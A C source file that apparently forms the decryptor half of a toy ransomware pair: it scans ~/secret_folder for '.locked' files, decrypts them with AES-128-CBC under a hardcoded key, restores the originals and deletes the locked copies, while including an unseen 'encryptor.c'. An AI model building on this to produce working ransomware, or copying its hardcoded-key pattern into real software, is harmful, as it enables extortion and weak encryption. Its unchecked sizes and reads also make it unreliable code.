#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include "encryptor.c"  // Include the updated encryptor code

#define HARDCODED_KEY "my_super_secret_key!"

void decrypt_file(const char *file_path, EVP_CIPHER_CTX *ctx) {
    FILE *f = fopen(file_path, "rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *content = (unsigned char *)malloc(file_size);
    fread(content, 1, file_size, f);
    fclose(f);

    unsigned char *decrypted_content = (unsigned char *)malloc(file_size - AES_BLOCK_SIZE);
    
    // Decrypt using EVP
    unsigned char iv[AES_BLOCK_SIZE];
    memcpy(iv, content, AES_BLOCK_SIZE);  // Extract the IV
    int len = 0;
    if (!EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, (unsigned char *)HARDCODED_KEY, iv)) {
        free(content);
        free(decrypted_content);
        return;
    }

    if (!EVP_DecryptUpdate(ctx, decrypted_content, &len, content + AES_BLOCK_SIZE, file_size - AES_BLOCK_SIZE)) {
        free(content);
        free(decrypted_content);
        return;
    }

    int decrypted_len = len;
    if (!EVP_DecryptFinal_ex(ctx, decrypted_content + len, &len)) {
        free(content);
        free(decrypted_content);
        return;
    }
    decrypted_len += len;

    char original_path[256];
    snprintf(original_path, sizeof(original_path), "%s", file_path);
    original_path[strlen(original_path) - 7] = '\0';  // Remove ".locked"

    FILE *dec_file = fopen(original_path, "wb");
    if (dec_file != NULL) {
        fwrite(decrypted_content, 1, decrypted_len, dec_file);
        fclose(dec_file);
    }

    remove(file_path);
    free(content);
    free(decrypted_content);
}

void decrypt_secret_folder() {
    char *home = getenv("HOME");
    char target_folder[256];
    snprintf(target_folder, sizeof(target_folder), "%s/secret_folder", home);

    struct dirent *entry;
    DIR *dp = opendir(target_folder);
    if (dp == NULL) return;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        closedir(dp);
        return;
    }

    while ((entry = readdir(dp)) != NULL) {
        char file_path[256];
        snprintf(file_path, sizeof(file_path), "%s/%s", target_folder, entry->d_name);

        struct stat st;
        if (stat(file_path, &st) == 0 && S_ISREG(st.st_mode) && strstr(entry->d_name, ".locked")) {
            decrypt_file(file_path, ctx);
        }
    }

    EVP_CIPHER_CTX_free(ctx);
    closedir(dp);
}

int main() {
    decrypt_secret_folder();
    printf("\n[*] Decryption completed.\n");
    return 0;
}
